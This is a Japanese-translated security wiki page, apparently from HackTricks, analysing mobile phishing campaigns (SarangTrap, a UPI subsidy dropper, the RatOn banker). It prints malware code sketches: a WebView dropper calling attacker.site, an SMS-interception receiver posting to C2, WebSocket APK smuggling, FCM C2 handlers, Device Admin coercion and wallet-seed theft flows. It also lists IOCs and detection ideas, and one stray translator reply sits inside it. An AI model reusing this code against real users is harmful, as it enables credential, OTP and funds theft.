# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページは、脅威アクターが **malicious Android APKs** および **iOS mobile-configuration profiles** を phishing（SEO、social engineering、fake stores、dating apps など）を通じて配布するために使用する手法を扱います。資料は Zimperium zLabs が公開した SarangTrap キャンペーン（2025）やその他の公開研究を基にしています。

## Attack Flow

1. **SEO/Phishing Infrastructure**
* dating、cloud share、car service などの類似ドメインを多数登録する。
– Google のランキングを狙って `<title>` 要素に現地言語のキーワードや絵文字を使う。
– 同一のランディングページに Android（`.apk`）と iOS のインストール手順の両方をホストする。
2. **First Stage Download**
* Android: 未署名または「third-party store」APK への直接リンク。
* iOS: `itms-services://` または plain HTTPS リンクで悪意ある **mobileconfig** プロファイル（下記参照）。
3. **Post-install Social Engineering**
* 初回起動時にアプリは **invitation / verification code** を要求し、限定アクセスの錯覚を与える。
* そのコードは **HTTP で POST** され、Command-and-Control (C2) に送られる。
* C2 は `{"success":true}` を返す ➜ マルウェアは継続する。
* 有効なコードを送信しないサンドボックス／AV の動的解析は **悪意ある挙動を検出しない**（回避）。
4. **Runtime Permission Abuse** (Android)
* 危険な権限は **C2 の肯定的応答の後にのみ要求される**：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 最近の亜種は `AndroidManifest.xml` の SMS 用 `<uses-permission>` を削除するが、Java/Kotlin のコードパスは reflection 経由で SMS を読み取る処理を残している ⇒ 静的スコアを下げつつ、AppOps の乱用や古いターゲットで動作し続ける。
5. **Facade UI & Background Collection**
* アプリはローカル実装の無害なビュー（SMS ビューア、ギャラリーピッカー）を表示する。
* 同時に以下を吸い上げる：
- IMEI / IMSI、電話番号
- `ContactsContract` の完全ダンプ（JSON 配列）
- `/sdcard/DCIM` からの JPEG/PNG を [Luban](https://github.com/Curzibn/Luban) で圧縮してサイズを削減
- 任意で SMS 内容（`content://sms`）
ペイロードは **バッチで zip 圧縮** され、`HTTP POST /upload.php` で送信される。
6. **iOS Delivery Technique**
* 単一の **mobile-configuration profile** が `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等を要求して、デバイスを MDM のような監視下に登録することができる。
* Social-engineering の手順例:
1. 設定を開く ➜ *Profile downloaded*。
2. ランディングページのスクリーンショットに従い *Install* を三度タップする。
3. 未署名のプロファイルを信頼する ➜ 攻撃者は App Store の審査なしに *Contacts* と *Photo* の権限を得る。
7. **Network Layer**
* プレーン HTTP、しばしばポート 80 で HOST ヘッダは `api.<phishingdomain>.com` のようになる。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS なし → 見つけやすい）。

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – マルウェア評価時に Frida/Objection で invitation code フェーズを自動化して悪意ある分岐に到達する。
* **Manifest vs. Runtime Diff** – `aapt dump permissions` と実行時の `PackageManager#getRequestedPermissions()` を比較する；危険な権限が欠けているのは警告サイン。
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE` を設定して、コード入力後の異常な POST バーストを検出する。
* **mobileconfig Inspection** – macOS で `security cms -D -i profile.mobileconfig` を使い `PayloadContent` を列挙し、過剰な権限を見つける。

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** でキーワードに富んだドメインの急増を検出する。
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` を Google Play 外の Dalvik クライアントからのものとして検出。
* **Invite-code Telemetry** – APK インストール直後に 6～8 桁の数字コードを POST する挙動はステージングの指標となる。
* **MobileConfig Signing** – MDM ポリシーで未署名の configuration profiles をブロックする。

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## インジケータ（汎用）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView 支払いフィッシング (UPI) – Dropper + FCM C2 パターン

このパターンは、政府給付金を装ったキャンペーンでインドの UPI 認証情報や OTP を盗むために観測されています。攻撃者は配布と耐障害性のために信頼できるプラットフォームを連鎖させます。

### 信頼されたプラットフォームを横断する配布チェーン
- YouTube の誘導動画 → 説明欄に短縮リンクが含まれる
- 短縮リンク → 正規ポータルを模倣した GitHub Pages のフィッシングサイト
- 同じ GitHub リポジトリに、ファイルに直接リンクする偽の “Google Play” バッジ付きの APK がホストされる
- 動的なフィッシングページは Replit 上で稼働；リモートコマンドチャネルには Firebase Cloud Messaging (FCM) を使用

### 埋め込みペイロードとオフラインインストールを伴う Dropper
- 最初の APK はインストーラー（dropper）で、実際のマルウェアを `assets/app.apk` に同梱し、クラウド検出を鈍らせるために Wi‑Fi/mobile data を無効化するようユーザーに促す。
- 埋め込まれたペイロードは無害に見えるラベル（例: “Secure Update”）でインストールされる。インストール後、インストーラーとペイロードは別個のアプリとして共存する。

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink経由の動的 endpoint 検出
- Malwareは、shortlinkからプレーンテキストのコンマ区切りのライブ endpoints 一覧を取得し、簡単な文字列変換で最終的な phishing ページのパスを生成する。

例（サニタイズ済み）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
擬似コード:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebViewベースのUPI認証情報収集
- 「₹1 / UPI‑Lite の支払い」ステップは、動的エンドポイントから攻撃者のHTMLフォームをWebView内に読み込み、機密フィールド（電話番号、銀行、UPI PIN）を取得し、それらを`POST`して`addup.php`に送信します。

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 過剰な権限が初回実行時に要求される:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 連絡先がループ処理され、被害者のデバイスからsmishing SMSが大量送信される。
- 着信SMSはbroadcast receiverによって傍受され、メタデータ（送信者、本文、SIMスロット、デバイスごとのランダムID）と共に `/addsm.php` にアップロードされる。

Receiverのスケッチ:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) を耐障害性のある C2 として
- ペイロードは FCM に登録され、プッシュメッセージはアクションをトリガーするスイッチとして `_type` フィールドを含む（例: phishing テキストテンプレートの更新、挙動の切り替え）。

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler のスケッチ:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### ハンティングパターンと IOCs
- APKがセカンダリペイロードを `assets/app.apk` に含む
- WebViewが `gate.htm` から決済を読み込み、`/addup.php` に送信する
- SMSを `/addsm.php` に送信する
- ショートリンク経由で設定を取得（例: `rebrand.ly/*`）、CSVエンドポイントを返す
- 汎用の“Update/Secure Update”とラベル付けされたアプリ
- 信頼されていないアプリで、FCMの `data` メッセージが `_type` 判別子を含む

### 検出と防御のアイデア
- インストール中にネットワークを無効にするよう指示し、その後 `assets/` から2つ目のAPKをサイドロードするアプリにフラグを立てる。
- 次の権限組合せにアラートを出す: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebViewベースの決済フロー。
- 非企業ホストでの `POST /addup.php|/addsm.php` の出口トラフィックを監視し、既知のインフラをブロックする。
- Mobile EDRルール: FCMに登録し、`_type` フィールドで分岐する信頼されていないアプリ。

---

## Socket.IO/WebSocketベースの APK Smuggling + 偽の Google Play ページ

攻撃者は静的なAPKリンクを、Google Play風の誘いページに埋め込まれたSocket.IO/WebSocketチャネルに置き換えることが増えている。これによりペイロードのURLを隠し、URL/拡張子フィルタを回避し、現実的なインストールUXを維持する。

実際の事案で観測された典型的なクライアントフロー:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
なぜ簡単な対策を回避するのか:
- 静的なAPK URLは露出せず、ペイロードはWebSocketフレームからメモリ上で再構築される。
- 直接の.apkレスポンスをブロックするURL/MIME/拡張子フィルタは、WebSockets/Socket.IO経由でトンネリングされたバイナリデータを見逃す可能性がある。
- WebSocketsを実行しないクローラやURLサンドボックスはペイロードを取得できない。

ハンティングと検出のアイデア:
- Web/ネットワークのテレメトリ: 大きなバイナリチャンクを転送し、その後で MIME application/vnd.android.package-archive の Blob を生成しプログラム的に `<a download>` をクリックする WebSocket セッションをフラグする。socket.emit('startDownload') のようなクライアント文字列や、ページスクリプト内で chunk、downloadProgress、downloadComplete と名付けられたイベントを探す。
- Play-store spoof heuristics: Play風のページを配信する非Googleドメイン上で、Google Play UI 文字列（例: http.html:"VfPpkd-jY41G-V67aGc"）、混在言語のテンプレート、WSイベントで駆動される偽の“verification/progress”フローを探す。
- コントロール: 非GoogleオリジンからのAPK配布をブロックする；WebSocketトラフィックを含めたMIME/拡張子ポリシーを強制する；ブラウザの安全なダウンロードプロンプトを維持する。

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn の banker/RAT キャンペーン（ThreatFabric）は、現代のモバイルフィッシング作戦が WebView ドロッパー、Accessibility 駆動の UI 自動化、オーバーレイ/身代金、Device Admin の強制、Automated Transfer System (ATS)、暗号ウォレット乗っ取り、さらには NFC リレーのオーケストレーションをどのように組み合わせるかを示す具体例である。本節では再利用可能な手法を抽象化する。

### Stage-1: WebView → ネイティブインストールブリッジ (dropper)

攻撃者は攻撃者ページを指す WebView を表示し、ネイティブインストーラを公開する JavaScript インターフェイスを注入する。HTML ボタンのタップがネイティブコードを呼び出し、dropper の assets にバンドルされたセカンドステージの APK をインストールして直接起動する。

最小パターン:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
翻訳するHTML/Markdownの内容が提示されていません。翻訳したいページの本文（HTMLまたはMarkdown）をここに貼ってください。タグ、リンク、コード、パスはご指定どおり変更せずそのまま保持します。
```html
<button onclick="bridge.installApk()">Install</button>
```
インストール後、dropper は明示的な package/activity 経由で payload を起動します:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### 同意フロー：Accessibility + Device Admin + その後のランタイムプロンプト
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility programmatically helps accept later prompts by finding buttons like “Allow”/“OK” in the node-tree and dispatching clicks.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
参照:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView を使った Overlay phishing/ransom
オペレーターは次のコマンドを発行できる:
- URL からフルスクリーンのオーバーレイをレンダリングする、または
- WebView オーバーレイにロードされるインライン HTML を渡す。

想定される用途: 強要（PIN 入力）、wallet を開かせて PIN を取得、ransom メッセージの送信。オーバーレイ権限がない場合に付与されているかを確認するコマンドを用意しておくこと。

### リモートコントロールモデル – テキスト擬似スクリーン + screen-cast
- 低帯域向け: 定期的に Accessibility のノードツリーをダンプし、表示されている texts/roles/bounds をシリアライズして pseudo-screen として C2 に送る（コマンド例: `txt_screen`（単発）と `screen_live`（継続））。
- 高忠実度: MediaProjection を要求し、必要に応じて screen-casting/recording を開始する（コマンド例: `display` / `record`）。

### ATS プレイブック（銀行アプリの自動化）
JSON タスクが与えられると、銀行アプリを開き、Accessibility を介してテキストクエリと座標タップを組み合わせて UI を操作し、プロンプトが表示されたら被害者の支払い PIN を入力する。

タスク例:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
あるターゲットフローで見られた例文 (CZ → EN):
- "Nová platba" → "新規支払い"
- "Zadat platbu" → "支払いを入力"
- "Nový příjemce" → "新規受取人"
- "Domácí číslo účtu" → "国内口座番号"
- "Další" → "次へ"
- "Odeslat" → "送信"
- "Ano, pokračovat" → "はい、続ける"
- "Zaplatit" → "支払う"
- "Hotovo" → "完了"

オペレーターは、`check_limit` や `limit` のようなコマンドを使って、同様に制限の UI を操作し、送金限度を確認または引き上げることもできます。

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: ロック解除（盗まれたPINまたは提供されたパスワード）、Security/Recovery に移動、seed phrase を表示/公開、keylog/exfiltrate する。言語間のナビゲーションを安定させるため、locale-aware セレクタ（EN/RU/CZ/SK）を実装する。

### Device Admin coercion
Device Admin APIs は PIN 把握の機会を増やし、被害者を苛立たせるために使用される:

- 即時ロック:
```java
dpm.lockNow();
```
- 現在の credential を期限切れにして変更を強制する (Accessibility が新しい PIN/password を取得する):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard biometric features を無効化して、非生体認証でのロック解除を強制する:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- WebView で `addJavascriptInterface()` を使い installer/permission メソッドを公開しているもの、Accessibility プロンプトを誘発する “/access” で終わるページを探索する。
- サービスアクセス付与直後に高頻度の Accessibility ジェスチャ/クリックを発生させるアプリや、Accessibility node dumps に類似したテレメトリを C2 に送信する挙動を検知してアラートする。
- 信頼されていないアプリによる Device Admin ポリシーの変更を監視する: `lockNow`、パスワード有効期限、keyguard 機能のトグルなど。
- 非企業アプリからの MediaProjection プロンプトと、それに続く定期的なフレームアップロードを検出してアラートする。
- 別のアプリによってトリガーされて外部 NFC-relay アプリがインストール/起動されることを検出する。
- 銀行系対策: out-of-band 確認、バイオメトリクスのバインディング、オンデバイス自動化に耐性のある取引上限を強制する。

## 参考

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
